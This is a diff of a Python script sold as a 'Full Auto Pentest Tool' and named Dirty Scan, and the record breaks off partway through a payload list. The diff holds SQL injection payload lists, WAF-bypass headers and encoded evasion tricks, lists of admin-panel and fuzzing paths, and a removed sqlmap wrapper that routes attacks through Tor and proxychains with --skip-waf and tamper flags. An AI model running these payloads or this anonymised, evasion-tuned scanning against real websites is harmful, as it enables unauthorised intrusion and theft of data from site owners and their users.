@@ -1,408 +1,237 @@
 #!/usr/bin/env python3
+# ================================================================
+# Full Auto Pentest Tool - Complete Working Version
+# Author: Hydra Strozzz
+# Version: 3.0
+# ================================================================
 
 import os
 import sys
-import subprocess
-import platform
-import json
-import time
-import random
 import re
-import socket
-import ssl
-import threading
-import queue
-import urllib.parse
-import urllib.request
-import urllib.error
-import http.client
+import time
+import json
+import random
 import shutil
 import signal
-import tempfile
+import urllib
+import urllib.request
+import urllib.error
+import urllib.parse
+import subprocess
+import socket
+import ssl
 from datetime import datetime
-from pathlib import Path
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# ============================================================
-# NEW ADDITIONS - TOR + PROXYCHAIN + ANTI-RESET
-# ============================================================
-
-# Try to import optional Tor dependencies
 try:
-    import socks
-    REQUESTS_AVAILABLE = True
+    import requests
+    from colorama import init, Fore, Back, Style
+    init(autoreset=True)
 except ImportError:
-    REQUESTS_AVAILABLE = False
-
-# Global Tor manager
-TOR_RUNNING = False
-TOR_SOCKS_PORT = 9050
-PROXYCHAINS_AVAILABLE = False
-
-def check_tor_status():
-    """Check if Tor is running"""
-    global TOR_RUNNING
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(3)
-        result = sock.connect_ex(('127.0.0.1', 9050))
-        sock.close()
-        TOR_RUNNING = (result == 0)
-        return TOR_RUNNING
-    except:
-        TOR_RUNNING = False
-        return False
-
-def start_tor():
-    """Attempt to start Tor service"""
-    global TOR_RUNNING
-    print_info("Attempting to start Tor service...")
-    
-    commands = [
-        ["systemctl", "start", "tor"],
-        ["service", "tor", "start"],
-        ["tor", "--runasdaemon", "1"],
-    ]
-    
-    for cmd in commands:
-        try:
-            subprocess.run(cmd, capture_output=True, timeout=10)
-            time.sleep(3)
-            if check_tor_status():
-                print_good("Tor started successfully!")
-                return True
-        except:
-            continue
-    
-    print_warn("Could not start Tor. Please run: systemctl start tor")
-    return False
-
-def renew_tor_ip():
-    """Renew Tor IP address"""
-    global TOR_RUNNING
-    if not TOR_RUNNING:
-        return False
-    
-    try:
-        # Try restarting Tor
-        subprocess.run(["systemctl", "restart", "tor"], capture_output=True)
-        time.sleep(5)
-        print_good("Tor IP renewed!")
-        return True
-    except:
-        pass
-    return False
-
-def check_proxychains():
-    """Check if proxychains is available"""
-    global PROXYCHAINS_AVAILABLE
-    pc = shutil.which("proxychains4") or shutil.which("proxychains")
-    PROXYCHAINS_AVAILABLE = (pc is not None)
-    return PROXYCHAINS_AVAILABLE
-
-def get_proxychains_cmd():
-    """Get proxychains command prefix"""
-    if PROXYCHAINS_AVAILABLE:
-        pc = shutil.which("proxychains4") or shutil.which("proxychains")
-        return [pc]
-    return []
-
-# Modified SQLMap function with Tor + Anti-Reset
-def run_sqlmap_with_tor(url):
-    """Run sqlmap with Tor, proxychains, and anti-reset flags"""
-    print_section(" SQLMap with Tor + Anti-Reset ")
-    
-    sqlmap_path = shutil.which("sqlmap")
-    if not sqlmap_path:
-        common_paths = [
-            os.path.expanduser("~/sqlmap/sqlmap.py"),
-            "/usr/share/sqlmap/sqlmap.py",
-            "/opt/sqlmap/sqlmap.py",
-            "/data/data/com.termux/files/home/sqlmap/sqlmap.py"
-        ]
-        for sp in common_paths:
-            if os.path.exists(sp):
-                sqlmap_path = sp
-                break
-    
-    if not sqlmap_path:
-        print_error("sqlmap not found!")
-        print_info("Install: apt install sqlmap")
-        return
-    
-    # Check Tor status
-    if not check_tor_status():
-        print_warn("Tor not running! Attempting to start...")
-        start_tor()
-    
-    # Build command with ANTI-RESET flags (LOW THREADS = NO RESETS)
-    cmd = [
-        sqlmap_path,
-        "-u", url,
-        "--batch",
-        "--random-agent",
-        "--level=2",
-        "--risk=1",
-        "--threads=2",           # CRITICAL: Low threads prevents resets!
-        "--time-sec=3",
-        "--retries=10",          # More retries
-        "--delay=1",             # Delay between requests
-        "--flush-session",
-        "--fresh-queries",
-        "--smart",
-        "--skip-waf",
-        "--disable-coloring",
-        "--tamper=between,randomcase,space2comment"
-    ]
-    
-    # Add Tor flags if Tor is running
-    if TOR_RUNNING:
-        cmd.extend(["--tor", "--tor-type=SOCKS5", "--tor-port=9050"])
-        print_good("Tor integration enabled")
-    
-    # Wrap with proxychains if available
-    if PROXYCHAINS_AVAILABLE:
-        cmd = get_proxychains_cmd() + cmd
-        print_good("Proxychains enabled")
-    
-    print_info(f"Command: {' '.join(cmd)}")
-    print_info("NOTE: Using --threads=2 to prevent connection resets")
-    
-    try:
-        process = subprocess.Popen(
-            cmd,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            universal_newlines=True,
-            bufsize=1
-        )
-        
-        for line in iter(process.stdout.readline, ""):
-            line = line.strip()
-            if not line:
-                continue
-            
-            # Filter out annoying messages
-            if "connection reset" in line.lower():
-                print_warn(f"sqlmap: Connection reset - retrying...")
-            elif "integer casting" in line.lower():
-                print_info(f"sqlmap: Integer casting detected - continuing...")
-            elif "CRITICAL" in line:
-                if "connection reset" not in line.lower():
-                    print_error(f"sqlmap: {line}")
-            elif "WARNING" in line:
-                if "pre-connect" not in line.lower():
-                    print_warn(f"sqlmap: {line}")
-            elif "SUCCESS" in line or "identified" in line.lower() or "database" in line.lower():
-                print_good(f"sqlmap: {line}")
-            elif "INFO" in line:
-                print_info(f"sqlmap: {line}")
-            else:
-                print(f"  {line}")
-        
-        process.wait()
-        if process.returncode == 0:
-            print_good("sqlmap completed successfully!")
-        else:
-            print_warn(f"sqlmap exited with code {process.returncode}")
-            
-    except Exception as e:
-        print_error(f"Error: {e}")
+    os.system('pip install colorama requests')
+    import requests
+    from colorama import init, Fore, Back, Style
+    init(autoreset=True)
 
 # ============================================================
-# ORIGINAL DIRTY SCAN v1.0.0 CODE CONTINUES BELOW
-# (All features preserved exactly as they were)
+# CONSTANTS
 # ============================================================
 
-# ---------- Color Definitions ----------
-GREEN = '\033[0;32m'
-RED = '\033[0;31m'
-YELLOW = '\033[1;33m'
-CYAN = '\033[0;36m'
-BLUE = '\033[0;34m'
-MAGENTA = '\033[0;35m'
-BOLD = '\033[1m'
-NC = '\033[0m'
+AUTHOR = "Hydra Strozzz"
+VERSION = "3.0"
+BOLD = Style.BRIGHT
+NC = Style.RESET_ALL
+RED = Fore.RED
+GREEN = Fore.GREEN
+YELLOW = Fore.YELLOW
+BLUE = Fore.BLUE
+CYAN = Fore.CYAN
+MAGENTA = Fore.MAGENTA
+WHITE = Fore.WHITE
 
-# ---------- Global Configuration ----------
-VERSION = "1.0.0-TOR"
-AUTHOR = "Strozzz + ARBAB"
-TOOL_NAME = "Dirty Scan (Tor Edition)"
+# ============================================================
+# USER AGENTS
+# ============================================================
 
 USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0",
-    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0",
-    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
-    "Mozilla/5.0 (Windows NT 10.0; rv:126.0) Gecko/20100101 Firefox/126.0",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Android 14; Mobile; rv:126.0) Gecko/20100101 Firefox/126.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Whale/3.27.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
     "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
 ]
 
-WAF_SIGNATURES = {
-    "Cloudflare": {"headers": ["cf-ray", "cf-cache-status", "__cfduid"], "body": ["cloudflare-nginx", "CloudFlare"]},
-    "ModSecurity": {"headers": ["x-mod-security"], "body": ["Mod Security", "ModSecurity"]},
-    "Sucuri": {"headers": ["x-sucuri-id", "x-sucuri-cache"], "body": ["Sucuri", "cloudproxy"]},
-    "Akamai": {"headers": ["x-akamai-transformed"], "body": ["akamai"]},
-    "AWS WAF": {"headers": ["x-amzn-RequestId", "x-amzn-ErrorType"], "body": ["AWS WAF"]},
-    "F5 BIG-IP": {"headers": ["x-application-context"], "body": ["BigIP"]},
-    "Barracuda": {"headers": ["x-barracuda"], "body": ["Barracuda"]},
-    "Imperva/Incapsula": {"headers": ["x-iinfo", "x-cdn"], "body": ["incapsula", "Imperva"]},
-    "Wordfence": {"headers": [], "body": ["Wordfence"]},
-    "Comodo": {"headers": ["x-cfwaf"], "body": ["Comodo"]},
-    "Radware": {"headers": ["x-request-id"], "body": ["Radware"]},
-    "StackPath": {"headers": ["x-aspnet-version"], "body": ["StackPath"]},
-    "Varnish": {"headers": ["x-varnish", "via"], "body": ["varnish"]},
-    "Naxsi": {"headers": [], "body": ["naxsi"]},
-    "SafeLine": {"headers": ["x-sl-request-id"], "body": ["safeline"]},
-    "WebKnight": {"headers": [], "body": ["WebKnight"]},
-    "Fortinet FortiWeb": {"headers": ["x-fortiweb"], "body": ["FortiWeb"]},
-    "Citrix NetScaler": {"headers": ["x-netscaler-connection"], "body": ["NetScaler"]}
-}
-
-COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1433, 1521, 2049, 3306, 3389, 5432, 5900, 5985, 5986, 6379, 8080, 8443, 9000, 9090, 10000]
+# ============================================================
+# SQL ERROR PATTERNS
+# ============================================================
 
 SQL_ERROR_PATTERNS = [
-    r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQLSyntaxErrorException",
-    r"valid MySQL result", r"check the manual that corresponds to your MySQL server version",
-    r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result",
-    r"Microsoft OLE DB Provider for ODBC Drivers", r"Microsoft OLE DB Provider for SQL Server",
-    r"Driver.* SQL Server", r"DB2 SQL error",
-    r"\[SQL Server\]", r"Unclosed quotation mark",
-    r"ORA-[0-9]{5}", r"Oracle.*Driver", r"oracle\.jdbc",
-    r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException",
-    r"SQLite3::SQLException",
-    r'Macromedia.*SQL', r"CFQUERY", r"ColdFusion",
-    r"index.*corrupt", r"Syntax error in query",
-    r"Division by zero", r"Column count doesn't match",
-    r"Unknown column", r"Table .* doesn't exist",
-    r"SQLSTATE", r"Invalid query",
-    r"supplied argument is not a valid MySQL", r"mysql_fetch_array",
-    r"on MySQL result index", r"mysql_numrows",
-    r"mysql_num_rows", r"mysql_connect",
-    r"mysql_pconnect", r"query failed",
-    r"Warning: mssql_", r"MSSQL",
-    r"Procedure .* expects parameter", r"Server Error in '/' Application"
+    r"SQL syntax.*MySQL",
+    r"Warning.*mysql_.*",
+    r"MySQLSyntaxErrorException",
+    r"valid MySQL result",
+    r"MySqlException",
+    r"ORA-[0-9]{5}",
+    r"Oracle error",
+    r"PostgreSQL.*ERROR",
+    r"Warning.*\Wpg_.*",
+    r"valid PostgreSQL result",
+    r"SQLite/JDBCDriver",
+    r"SQLite.Exception",
+    r"System.Data.SQLite.SQLiteException",
+    r"Warning.*sqlite_.*",
+    r"valid SQLite result",
+    r"Microsoft OLE DB Provider for ODBC Drivers",
+    r"Microsoft OLE DB Provider for SQL Server",
+    r"Driver.*SQL Server",
+    r"SQLServer JDBC Driver",
+    r"com.microsoft.sqlserver",
+    r"Unclosed quotation mark",
+    r"Microsoft JET Database Engine",
+    r"Access Database Engine",
+    r"ODBC Microsoft Access",
+    r"DB2 SQL Error",
+    r"DB2Exception",
+    r"com.ibm.db2",
+    r"Informix.*SQL Error",
+    r"com.informix.jdbc",
+    r"Sybase.*SQL Error",
+    r"com.sybase.jdbc",
+    r"Adaptive Server Enterprise",
+    r"SQLSTATE",
+    r"Syntax error",
+    r"Unknown column",
+    r"Table '.*' doesn't exist",
+    r"Column count doesn't match",
+    r"Duplicate entry",
+    r"Data truncated",
+    r"Invalid query",
+    r"Database error",
+    r"Database connection",
+    r"PDOException",
+    r"mysqli_sql_exception",
+    r"SQLException",
+    r"DB Error",
 ]
 
+# ============================================================
+# WAF SIGNATURES
+# ============================================================
+
+WAF_SIGNATURES = {
+    "Cloudflare": {
+        "headers": ["CF-RAY", "Server: cloudflare"],
+        "body": ["cf-ray", "cloudflare"]
+    },
+    "ModSecurity": {
+        "headers": ["X-Mod-Security", "Sec-WebSocket-Protocol"],
+        "body": ["mod_security", "ModSecurity"]
+    },
+    "AWS WAF": {
+        "headers": ["X-Amzn-RequestId", "X-Amzn-Trace-Id"],
+        "body": ["x-amzn-requestid"]
+    },
+    "Akamai": {
+        "headers": ["X-Akamai-Transformed", "Server: Akamai"],
+        "body": ["akamai"]
+    },
+    "Imperva": {
+        "headers": ["X-Protected-By", "Server: Secure"],
+        "body": ["incapsula", "imperva"]
+    },
+    "F5 BIG-IP": {
+        "headers": ["X-Cnection", "X-Forwarded-For"],
+        "body": ["BIG-IP", "F5"]
+    },
+    "Sucuri": {
+        "headers": ["X-Sucuri-ID", "Server: Sucuri"],
+        "body": ["sucuri"]
+    },
+    "Barracuda": {
+        "headers": ["X-Barracuda", "Server: Barracuda"],
+        "body": ["barracuda"]
+    },
+}
+
+# ============================================================
+# WAF BYPASS HEADERS
+# ============================================================
+
 WAF_BYPASS_HEADERS = [
-    {"X-Originating-IP": "127.0.0.1"},
     {"X-Forwarded-For": "127.0.0.1"},
+    {"X-Originating-IP": "127.0.0.1"},
     {"X-Remote-IP": "127.0.0.1"},
     {"X-Remote-Addr": "127.0.0.1"},
     {"X-Client-IP": "127.0.0.1"},
-    {"X-Host": "127.0.0.1"},
-    {"X-Forwarded-Host": "127.0.0.1"},
-    {"Client-IP": "127.0.0.1"},
-    {"True-Client-IP": "127.0.0.1"},
     {"X-Real-IP": "127.0.0.1"},
-    {"X-Original-URL": "/"},
-    {"X-Rewrite-URL": "/"},
-    {"X-Forwarded-For": "127.0.0.1, 127.0.0.1"},
-    {"X-Originating-IP": "[::1]"},
-    {"X-Forwarded-For": "localhost"},
-    {"X-Forwarded-For": "2130706433"},
-    {"X-Forwarded-For": "0x7f000001"},
-    {"Content-Type": "application/x-www-form-urlencoded; charset=ibm037"},
-    {"Accept": "*/*"},
+    {"X-Forwarded-Host": "localhost"},
+    {"X-Forwarded-Server": "localhost"},
+    {"X-HTTP-Method-Override": "GET"},
+    {"X-HTTP-Method": "GET"},
+    {"X-Method-Override": "GET"},
+    {"Accept-Encoding": "gzip, deflate"},
+    {"Accept-Charset": "utf-8"},
     {"Accept-Language": "en-US,en;q=0.9"},
-    {"Cache-Control": "no-cache"},
+    {"Cache-Control": "no-cache, no-store, must-revalidate"},
     {"Pragma": "no-cache"},
-    {"Upgrade-Insecure-Requests": "1"}
-]
-
-WAF_BYPASS_PAYLOADS_SQLI = [
-    "' OR '1'='1",
-    "' OR '1'='1' -- -",
-    "' OR '1'='1' #",
-    "' OR 1=1 -- -",
-    "\" OR \"1\"=\"1",
-    "' UNION SELECT NULL-- -",
-    "' UNION SELECT NULL,NULL-- -",
-    "' UNION SELECT NULL,NULL,NULL-- -",
-    "1' ORDER BY 1-- -",
-    "1' ORDER BY 2-- -",
-    "1' ORDER BY 3-- -",
-    "1' ORDER BY 4-- -",
-    "1' ORDER BY 5-- -",
-    "1' GROUP BY 1-- -",
-    "1' GROUP BY 2-- -",
-    "1' GROUP BY 3-- -",
-    "' AND 1=1-- -",
-    "' AND 1=2-- -",
-    "1' AND '1'='1",
-    "1' AND '1'='2",
-    "1'/**/ORDER/**/BY/**/1-- -",
-    "1'/*!ORDER BY*/1-- -",
-    "' UN/**/ION SEL/**/ECT 1,2,3-- -",
-    "'+UNION+SELECT+1,2,3-- -",
-    "'%09UNION%09SELECT%091,2,3-- -",
-    "'/*!00000UNION*//*!00000SELECT*/1,2,3-- -",
-    "' UNION ALL SELECT NULL,NULL,NULL-- -",
-    "' UNION DISTINCT SELECT NULL,NULL,NULL-- -",
-    "1' AND SLEEP(5)-- -",
-    "1' AND BENCHMARK(5000000,MD5('test'))-- -",
-    "' OR 'a'='a'",
-    "')) OR (('1'='1",
-    "1' HAVING 1=1-- -",
-    "'/**/UNION/**/ALL/**/SELECT/**/NULL,NULL,NULL-- -",
-    "1' ORDER BY 1/*",
-    "1' ORDER BY 1--",
-    "1' ORDER BY 1#",
-    "1' AND 1=1 AND '%'='",
-    "1' AND 1=1 UNION SELECT 1,2,3-- -"
+    {"Referer": "https://www.google.com/"},
+    {"Origin": "https://www.google.com"},
 ]
 
 # ============================================================
-# BANNER (Updated with Tor info)
+# ADMIN PATHS
 # ============================================================
 
-def show_banner():
-    os.system('clear' if os.name == 'posix' else 'cls')
-    print(f"{RED}")
-    banner_lines = [
-        "______ _      _          _____                  ",
-        "|  _  \(_)    | |        /  ___|                 ",
-        "| | | | _ _ __| |_ _   _ \ `--.  ___  __ _ _ __  ",
-        "| | | || | '__| __| | | | `--. \/ __|/ _` | '_ \ ",
-        "| |/ / | | |  | |_| |_| |/\__/ / (__| (_| | | | |",
-        "|___/  |_|_|   \__|\__, |\____/ \___|\__,_|_| |_|",
-        "                    __/ |                        ",
-        "                   |___/                         "
-    ]
-    for line in banner_lines:
-        print(f"{RED}{line}{NC}")
-    print(f"{YELLOW}  [+] Created by: {AUTHOR}{NC}")
-    print(f"{YELLOW}  [+] Version   : {VERSION}{NC}")
-    print(f"{YELLOW}  [+] Tool      : {TOOL_NAME}{NC}")
-    
-    # Show Tor status
-    check_tor_status()
-    check_proxychains()
-    if TOR_RUNNING:
-        print(f"{GREEN}  [+] Tor        : RUNNING{NC}")
-    else:
-        print(f"{RED}  [-] Tor        : NOT RUNNING{NC}")
-    if PROXYCHAINS_AVAILABLE:
-        print(f"{GREEN}  [+] Proxychains: AVAILABLE{NC}")
-    
-    print(f"{GREEN}  [+] Status    : Ready for scanning...{NC}")
-    print()
+ADMIN_PATHS = [
+    "/admin", "/administrator", "/adminpanel", "/admin-area",
+    "/admin_area", "/adm", "/cp", "/controlpanel", "/dashboard",
+    "/management", "/manage", "/panel", "/pages/admin",
+    "/wp-admin", "/administrator", "/admin/login",
+    "/user/login", "/login", "/log-in", "/signin",
+    "/sign-in", "/auth", "/authenticate",
+    "/backend", "/backoffice", "/webadmin", "/sysadmin",
+    "/secure", "/security", "/private",
+    "/portal", "/cpanel", "/whm", "/directadmin",
+    "/plesk", "/ispconfig", "/vesta",
+    "/dev", "/developer", "/devpanel",
+    "/api/admin", "/graphql", "/swagger",
+    "/cms", "/config", "/configuration",
+    "/setup", "/install", "/wizard",
+    "/server-status", "/server-info",
+    "/phpmyadmin", "/pma", "/mysql-admin",
+    "/pgadmin", "/adminer",
+    "/admin.php", "/admin.jsp", "/admin.aspx",
+    "/login.php", "/login.jsp", "/login.aspx",
+    "/admin/index.php", "/admin/login.php",
+    "/admin/dashboard.php", "/admin/cpanel.php",
+]
 
 # ============================================================
-# UTILITY FUNCTIONS (UNCHANGED)
+# COMMON PORTS
+# ============================================================
+
+COMMON_PORTS = [21, 22, 23, 25, 53, 80, 81, 110, 111, 135, 139, 143, 443, 445, 465, 514, 587, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080, 8443, 27017]
+
+# ============================================================
+# DIRECTORY FUZZING WORDLIST
+# ============================================================
+
+FUZZ_WORDLIST = [
+    "admin", "backup", "config", "css", "dev", "files", "images", "includes", 
+    "js", "lib", "logs", "media", "old", "php", "plugins", "private", "public",
+    "scripts", "sql", "src", "test", "tmp", "uploads", "var", "www",
+    "wp-content", "wp-includes", "wp-admin", "wp-json", "xmlrpc.php",
+    "robots.txt", "sitemap.xml", "backup.zip", "backup.sql", "config.php",
+    "index.php", "login.php", "admin.php", "db.php", "settings.php",
+]
+
+# ============================================================
+# UTILITY FUNCTIONS
 # ============================================================
 
 def print_info(msg):
@@ -438,32 +267,88 @@ def extract_domain(url):
     parsed = urllib.parse.urlparse(url)
     return parsed.netloc or parsed.path.split("/")[0]
 
+TOR_RUNNING = False
+PROXYCHAINS_AVAILABLE = False
+
+def check_tor_status():
+    global TOR_RUNNING
+    try:
+        import socket
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(2)
+        result = sock.connect_ex(('127.0.0.1', 9050))
+        sock.close()
+        TOR_RUNNING = (result == 0)
+        return TOR_RUNNING
+    except:
+        TOR_RUNNING = False
+        return False
+
+def start_tor():
+    try:
+        subprocess.Popen(["tor", "--quiet"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(3)
+        return check_tor_status()
+    except:
+        return False
+
+def check_proxychains():
+    global PROXYCHAINS_AVAILABLE
+    PROXYCHAINS_AVAILABLE = bool(shutil.which("proxychains"))
+    return PROXYCHAINS_AVAILABLE
+
+def get_proxychains_cmd():
+    if PROXYCHAINS_AVAILABLE:
+        return ["proxychains"]
+    return []
+
+def show_banner():
+    os.system('clear' if os.name == 'posix' else 'cls')
+    print(f"{RED}")
+    banner_lines = [
+        "______ _      _          _____                  ",
+        "|  _  \(_)    | |        /  ___|                 ",
+        "| | | | _ _ __| |_ _   _ \ `--.  ___  __ _ _ __  ",
+        "| | | || | '__| __| | | | `--. \/ __|/ _` | '_ \ ",
+        "| |/ / | | |  | |_| |_| |/\__/ / (__| (_| | | | |",
+        "|___/  |_|_|   \__|\__, |\____/ \___|\__,_|_| |_|",
+        "                    __/ |                        ",
+        "                   |___/                         "
+    ]
+    for line in banner_lines:
+        print(f"{RED}{line}{NC}")
+    print(f"{YELLOW}  [+] Author : {AUTHOR}{NC}")
+    print(f"{YELLOW}  [+] Version: {VERSION}{NC}")
+    print(f"{YELLOW}  [+] Mode   : Full Auto Pentest{NC}")
+    check_tor_status()
+    check_proxychains()
+    if TOR_RUNNING:
+        print(f"{GREEN}  [+] Tor     : RUNNING{NC}")
+    if PROXYCHAINS_AVAILABLE:
+        print(f"{GREEN}  [+] Proxy   : AVAILABLE{NC}")
+    print(f"{GREEN}  [+] Status  : Ready{NC}")
+    print()
+
 # ============================================================
-# REQUIREMENTS INSTALLATION (UNCHANGED)
+# REQUIREMENTS CHECK
 # ============================================================
 
 def check_install_requirements():
     print_section(" Checking Requirements ")
     required_pkgs = ["requests", "colorama"]
-
     pip_paths = [
-        shutil.which("pip"),
-        shutil.which("pip3"),
+        shutil.which("pip"), shutil.which("pip3"),
         "/data/data/com.termux/files/usr/bin/pip",
         "/data/data/com.termux/files/usr/bin/pip3",
-        "/usr/bin/pip",
-        "/usr/bin/pip3"
+        "/usr/bin/pip", "/usr/bin/pip3"
     ]
-
     pip_cmd = None
     for p in pip_paths:
         if p and os.path.exists(p):
             pip_cmd = p
             break
-
     if not pip_cmd:
         pip_cmd = [sys.executable, "-m", "pip"]
-
     for pkg in required_pkgs:
         try:
             __import__(pkg.replace("-", "_"))
@@ -476,55 +361,95 @@ def check_install_requirements():
                 else:
                     subprocess.check_call([pip_cmd, "install", pkg, "-q"])
                 print_good(f"{pkg} installed successfully")
-            except Exception as e:
-                print_warn(f"Could not install {pkg}: {str(e)}")
-                print_info("Please run: pip install " + pkg)
-
-    sqlmap_path = shutil.which("sqlmap")
-    if sqlmap_path:
-        print_good(f"sqlmap found at {sqlmap_path}")
+            except:
+                print_warn(f"Could not install {pkg}")
+    if shutil.which("sqlmap"):
+        print_good("sqlmap found")
     else:
-        print_warn("sqlmap not found. SQL injection will use internal methods.")
-
-    nmap_path = shutil.which("nmap")
-    if nmap_path:
-        print_good(f"nmap found at {nmap_path}")
+        print_warn("sqlmap not found - run: apt install sqlmap")
+    if shutil.which("nikto"):
+        print_good("nikto found")
     else:
-        print_warn("nmap not found. Port scanning will use Python socket methods.")
-
-    print()
-    
-    sqlmap_path = shutil.which("sqlmap")
-    if sqlmap_path:
-        print_good(f"sqlmap found at {sqlmap_path}")
+        print_warn("nikto not found - run: apt install nikto")
+    if shutil.which("nmap"):
+        print_good("nmap found")
     else:
-        print_warn("sqlmap not found in PATH.")
-        print_info("To install sqlmap: apt install sqlmap (Linux/Termux) or git clone https://github.com/sqlmapproject/sqlmap.git")
-    
-    nmap_path = shutil.which("nmap")
-    if nmap_path:
-        print_good(f"nmap found at {nmap_path}")
-    else:
-        print_warn("nmap not found. Port scanning will use Python socket methods.")
-    
+        print_warn("nmap not found")
     print()
 
 # ============================================================
-# WAF DETECTION MODULE (UNCHANGED)
+# WAF BYPASS PAYLOADS SQLI
+# ============================================================
+
+WAF_BYPASS_PAYLOADS_SQLI = [
+    "' OR '1'='1",
+    "' OR '1'='1'--",
+    "' OR '1'='1'#",
+    "' OR 1=1--",
+    "' OR 1=1#",
+    "' AND 1=1--",
+    "' AND 1=2--",
+    "' UNION SELECT NULL--",
+    "' UNION SELECT NULL,NULL--",
+    "' UNION SELECT 1,2,3--",
+    "' UNION SELECT 1,2,3,4--",
+    "' UNION SELECT 1,database(),3--",
+    "' UNION SELECT 1,version(),3--",
+    "' UNION SELECT 1,user(),3--",
+    "' AND SLEEP(5)--",
+    "' AND SLEEP(10)--",
+    "' AND BENCHMARK(5000000,MD5(1))--",
+]
+
+# ============================================================
+# WAF BYPASS TECHNIQUES
+# ============================================================
+
+WAF_BYPASS_TECHNIQUES_SQL = [
+    {"name": "Comment Injection", "payload": "'/**/OR/**/'1'='1"},
+    {"name": "Comment UNION", "payload": "'/**/UNION/**/SELECT/**/1,2,3-- -"},
+    {"name": "Case Variation", "payload": "'/**/UnIoN/**/SeLeCt/**/1,2,3-- -"},
+    {"name": "Double URL Encoding", "payload": "%25%32%37%20%4F%52%20%27%31%27%3D%27%31"},
+    {"name": "Hex Encoding", "payload": "' OR 0x313d31-- -"},
+    {"name": "Null Byte", "payload": "%00' OR '1'='1"},
+    {"name": "Buffer Overflow", "payload": "' OR '1'='1" + "A" * 5000},
+    {"name": "HPP", "payload": "id=1&id=1' OR '1'='1"},
+    {"name": "Whitespace Bypass", "payload": "'%09OR%0A'1'='1"},
+    {"name": "Scientific Notation", "payload": "' OR 1e0=1e0-- -"},
+    {"name": "Backtick Bypass", "payload": "' OR `1`=`1`-- -"},
+    {"name": "Newline Injection", "payload": "'%0AOR%0A'1'='1"},
+    {"name": "No Equal", "payload": "' OR '1'LIKE'1'-- -"},
+    {"name": "Negative Value", "payload": "' OR '-1'='-1"},
+    {"name": "Comparison Operator", "payload": "' OR 1>0-- -"},
+    {"name": "Modulo Bypass", "payload": "' OR 1%2=1-- -"},
+    {"name": "Pipe OR", "payload": "' || '1'='1"},
+    {"name": "Ampersand AND", "payload": "' && '1'='1"},
